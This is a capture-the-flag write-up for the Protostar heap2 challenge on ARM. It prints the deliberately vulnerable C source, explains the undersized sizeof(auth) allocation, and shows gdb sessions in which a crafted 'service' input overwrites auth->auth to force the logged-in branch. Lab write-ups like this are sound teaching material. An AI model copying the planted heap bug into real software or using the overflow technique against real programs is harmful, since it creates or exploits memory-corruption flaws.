## Protostar ARM heap2

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;

      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```
#### _Let's start_

To solve this challenge we will try to understand the flow of the program and reach the branch which prints `you have logged in already!`.

Let's execute our program
```
pi@raspberrypi:~/protostar/heap/heap2 $ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x145e960, service = (nil) ]
auth BBBB
[ auth = 0x145e970, service = (nil) ]

```

What?! Surprisingly for the `auth struct` are allocated only `16 bytes (0x145e9700 - 0x145e960)`. This happens due to an error in the source code `auth = malloc(sizeof(auth));`, the `sizeof` must be related to `struct auth` and not to the variable `auth`.

```
[ auth = (nil), service = (nil) ]
auth a
[ auth = 0x251960, service = (nil) ]
service b
[ auth = 0x251960, service = 0x251970 ]
```

Trying to use `service b` as input we can see that pointer is allocated `16 bytes` over the `struct auth`, maybe we will be able to overwrite the original values from the struct and change the value checked in memory `(auth->auth)` when we type `login`.

Let's try

```code
gef➤  print auth
$1 = (struct auth *) 0x22960
gef➤  print auth->auth
$2 = 0x0
gef➤  print &auth->auth
$3 = (int *) 0x22980
gef➤  x/20x 0x22960
0x22960:	0x00000a61	0x00000000	0x00000000	0x00000000
0x22970:	0x00000000	0x00000000	0x00000000	0x00000000
0x22980:	0x00000000	0x00020681	0x00000000	0x00000000
gef➤  c
Continuing.
service AAAABBBBCCCCDDDDE
[ auth = 0x22960, service = 0x22970 ]

....
gef➤  print auth->auth
$4 = 0xa4544
gef➤  c
Continuing.
login
you have logged in already!
[ auth = 0x22960, service = 0x22970 ]

```

__*Done :)*__
